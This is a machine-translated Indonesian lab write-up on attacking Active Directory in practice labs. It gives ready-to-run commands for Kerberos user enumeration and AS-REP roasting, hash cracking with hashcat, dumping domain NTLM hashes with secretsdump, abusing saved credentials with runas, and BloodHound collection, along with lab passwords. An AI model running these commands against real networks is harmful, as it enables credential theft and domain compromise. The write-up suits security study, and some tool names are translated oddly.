---
title: "Enumeration Active Directory"
description: "Enumerasi Active Directory Tanpa Kredensial 139 & 445 Enumerasi Pengguna SMB dengan Eksploitasi Kerberoast Kerberos melalui ASREPRoasting ASReproasting terjadi ketika akun pengguna memiliki hak istimewa \"Does"
lang: "id"
translationKey: "enumeration-active-directory"
category: "lab-writeups"
tags: []
publishDate: "2024-11-09"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "1395fca1-ed80-8097-9b3f-faa00ee389f5"
notionUrl: "https://app.notion.com/p/Enumeration-Active-Directory-1395fca1ed8080979b3ffaa00ee389f5"
notionLastEdited: "2025-01-03T14:51:00.000Z"
---

# Enum Active Directory

## Tidak Ada Kredensial

### 139 & 445 (SMB)

```bash
enum4linux 10.10.107.99
```

### Enumerasi Pengguna dengan Kerberoast

```bash
### from nmap we got DNS_Domain_Name: spookysec.local
./kerbrute_linux_amd64 userenum --dc 10.10.107.99 -d spookysec.local userlist.txt
```

### Eksploitasi Kerberos melalui **ASREPRoasting**

> ASReproasting terjadi ketika akun pengguna memiliki hak istimewa "Tidak memerlukan Pra-Autentikasi". Ini berarti bahwa akun tersebut **tidak** perlu memberikan identifikasi yang valid sebelum meminta Tiket Kerberos pada akun pengguna yang ditentukan.

```bash
impacket-GetNPUsers -dc-ip 10.10.242.75 -request -outputfile hashes.asreproast spookysec.local/ -no-pass -usersfile usernames.txt
```

![](/images/enumeration-active-directory/512c5b5fa16c.png)

Cracking Kerberoast AS-REP

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## Dengan Kredensial

Lakukan enumerasi SMB Share dengan kredensial yang telah kami peroleh.

![](/images/enumeration-active-directory/62688c39c831.png)

### Buang HASH NTLM melalui Impacket

```bash
# domain/credential@ip_target
impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.10.242.75
```

![](/images/enumeration-active-directory/aec38db4549b.png)

### Runas Winpriv (Kredensial Tersimpan)

Identifikasi kredensial yang tersimpan:

```bash
cmdkey /list
```

Mengeksploitasi Kredensial yang Tersimpan:

```bash
runas /savecred /user:WORKGROUP\User "Program to execute"
```

Referensi : [steflan](https://steflan-security.com/windows-privilege-escalation-runas-stored-credentials/), [raksasa](https://juggernaut-sec.com/runas/)

### Enum OU (Unit Organisasi)

```bash
Get-ADOrganizationalUnit -Filter {Name -eq "workstations"} 
```

### Enum Menggunakan Jaringan

```bash
# Enum all users in domain
net user /domain
# enum spesific user in domain 
net user <nama_user> /domain
# enum all group in domain
net group /domain
# enull spesific group in domain
net group <nama_group> /domain
# enum password policy in domain
net accounts /domain

```

### Enum Bersama Anjing Pelacak

Referensi : [enum dengan anjing pelacak](https://medium.com/@e.escalante.jr/active-directory-workshop-even-more-server-enumeration-using-the-bloodhound-tool-pt-9-d4138f505b9b)

```bash
#using bloodhound pyhton
bloodhound-python -d za.tryhackme.com -u leslie.young -p 1CZY15ztC -c all -v -ns 10.200.68.248
#if you always got time out version when running above command
# try to run sharphound from inside.
# using sharphound.exe
SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
# using sharphound.ps1
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"

# all above command will produce .zip output, after getting .zip extract and import file
# .json into bloodhound
```

![](/images/enumeration-active-directory/a1aeceed4cc2.png)
